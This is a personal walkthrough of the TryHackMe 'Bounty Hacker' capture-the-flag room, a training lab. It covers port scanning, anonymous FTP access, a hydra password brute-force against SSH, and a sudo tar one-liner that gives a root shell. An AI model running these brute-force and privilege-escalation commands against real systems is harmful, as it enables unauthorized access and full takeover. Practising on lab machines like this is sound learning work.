<a href="https://tryhackme.com/room/cowboyhacker"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>

# bounty hacker

"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!" 
Easy level CTF

## nmap (rustscan)
Saw this on a John Hammond walk through, so I have been trying it out. Seems faster but I still need ot review the switches (as it sits on top of nmap - there should not be much difference.
```
~/CTF/tryhackme/bounty_hunter$ rustscan $IP --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/karti/.config/rustscan/config.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.137.143:21
Open 10.10.137.143:22
Open 10.10.137.143:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,80 10.10.137.143

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 08:21 BST
Initiating Ping Scan at 08:21
Scanning 10.10.137.143 [2 ports]
Completed Ping Scan at 08:21, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:21
Completed Parallel DNS resolution of 1 host. at 08:21, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:21
Scanning 10.10.137.143 [3 ports]
Discovered open port 80/tcp on 10.10.137.143
Discovered open port 22/tcp on 10.10.137.143
Discovered open port 21/tcp on 10.10.137.143
Completed Connect Scan at 08:21, 0.02s elapsed (3 total ports)
Nmap scan report for 10.10.137.143
Host is up, received syn-ack (0.020s latency).
Scanned at 2020-09-07 08:21:59 BST for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
```
Quickly followed by nmap
```
nmap -A -sC -sV $IP 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 08:25 BST
Nmap scan report for 10.10.137.143
Host is up (0.021s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.12.213
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
```
## nikto
```
~/CTF/tryhackme/bounty_hunter$ nikto -h $IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.137.143
+ Target Hostname:    10.10.137.143
+ Target Port:        80
+ Start Time:         2020-09-07 08:21:48 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 3c9, size: 5a789fef9846b, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-09-07 08:25:19 (GMT1) (211 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
## gobuster
```
~/CTF/tryhackme/bounty_hunter$ gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.137.143
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/07 08:22:14 Starting gobuster
===============================================================
/images (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/07 08:29:58 Finished
===============================================================
```
## website

So quick check for robots.txt found that it did not exist. Next checking the source code of the main and what appears to be the only page. Again nothing stands out other than we may have a number of usernames as part of the conversation.
```
<html>

<style>
h3 {text-align: center;}
p {text-align: center;}
.img-container {text-align: center;}
</style>

<div class='img-container'>
	<img src="/images/crew.jpg" tag alt="Crew Picture" style="width:1000;height:563">
</div>

<body>
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>

<hr>

<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>

<hr>

<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>

<hr>

<h3>Faye:"..hmph.."</h3>

</body>
</html>
```
So possibly:

1. Spike
1. Jet
1. Ed
1. Edward
1. Ein
1. Faye

FInally checking the images file as found in gobuster. 

```
Index of /images
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[IMG]	crew.jpg	2020-06-05 14:56 	608K	 
Apache/2.4.18 (Ubuntu) Server at 10.10.137.143 Port 80

```
## image
I did a few checks on the crew.jpg, each not finding anything. I even tried stegcrack while I searched around the other areas.

2. Steghide - nothing
2. Stegsolve - nothing
2. Exiftools - nothing
2. Strings - nothing
2. Stegcraker - it was running in the background but nothing came form it by the time I had closed the room.

## ftp
As we saw in the port scan we have an anonymous ftp that we should check out.

```
~/CTF/tryhackme/bounty_hunter$ ftp $IP
Connected to 10.10.137.143.
220 (vsFTPd 3.0.3)
Name (10.10.137.143:karti): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> mget locks.txt task.txt
mget locks.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.10 secs (4.1589 kB/s)
mget task.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (15.9057 kB/s)
ftp> 
```
So we now have two files. Lets look at the first one - locks.txt
```
~/CTF/tryhackme/bounty_hunter$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
So possibly a password file. Perhaps we could use our list of possible users?

The next file, task.txt.

```
~/CTF/tryhackme/bounty_hunter$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
OK from this nothing that jumps out, however we may have another possible user, which I will add to my list..

## hydra
Lets try ftp first and see if it gets us anywhere. I created a user list, taken from above as well as adding Lin, for simplicity in the attack.
```
/CTF/tryhackme/bounty_hunter$ hydra -L user_list.txt -P locks.txt ftp://$IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-07 08:56:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 182 login tries (l:7/p:26), ~12 tries per task
[DATA] attacking ftp://10.10.137.143:21/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-07 08:56:45
```
OK Nothing shown there. Lets try ssh
```
~/CTF/tryhackme/bounty_hunter$ hydra -t 20 -L user_list.txt -P locks.txt ssh://$IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-07 08:58:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 182 login tries (l:7/p:26), ~10 tries per task
[DATA] attacking ssh://10.10.137.143:22/
[22][ssh] host: 10.10.137.143   login: lin   password: <insert-user-password-here>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-07 08:58:47
```
Right, we have a successful user and password. Lets see what we get next.

## ssh
```
~/CTF/tryhackme/bounty_hunter$ ssh lin@$IP
The authenticity of host '10.10.137.143 (10.10.137.143)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.137.143' (ECDSA) to the list of known hosts.
lin@10.10.137.143's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
```
OK Now lets look around.
```
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{<insert-user-flag-here>}
```
If I am honest I then did the sudo -l check and when it asked for the password, I forgot that I had it. I then spent 20 minutes figuring out what to do. Checked for SUID bits, had a look around the machine, and the lightbulb moment that I needed, came AFTER I found the .ssh file. I thought "I'll use that to get a proper login", which is where I remembered I actually have the bloody password in the first place.
Now with my password, the rest was smooth going.
```
lin@bountyhacker:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
So a quick look at GTFObins for tar and I had the command to give me privalage escalation, followed by a quick search for the flag.
```
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
# cd /root
# ls
root.txt
# cat root.txt	
THM{<insert-root-flag-here>}
# 
```
I really enjoyed this CTF. Nice story, TBH I was put off a little by the title as I didn't think that I would be good enough to do it, but more and more I'm finding as long as you are methodical and follow a plan, things work out.

This room was created by [Sevuhl](https://tryhackme.com/p/Sevuhl) and one I really enjoyed.

Thanks Sevuhl for your time.

Regards

Karti

<script src="https://tryhackme.com/badge/65208"></script>


